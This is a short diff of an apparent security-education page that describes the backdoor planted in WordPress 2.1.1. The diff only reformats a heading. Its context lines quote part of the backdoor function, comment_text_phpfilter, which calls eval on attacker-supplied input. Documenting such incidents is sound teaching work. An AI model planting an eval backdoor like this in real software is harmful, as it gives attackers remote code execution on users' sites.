@@ -26,7 +26,7 @@ __Fixed in Version:__  2.1.1
 Issue Type: Command Injection
 
 Original Code: <a title="Impact" href="http://spotthevuln.com/2010/01/impact/" target="_blank">Found Here</a>
-<h2>Description</h2>
+## Description
 This example was actually a backdoor someone had planted in WordPress 2.1.1.  Apparently, someone either broke into the wordpress server or hacked a wordpress dev account and inserted this back door.  The back door was simple, create a function which simply calls eval on a arguments passed to it.  The attacker named this function "comment_text_phpfilter()" and the contents of the function are provided below:
 <blockquote>function comment_text_phpfilter($filterdata) {
 eval($filterdata);
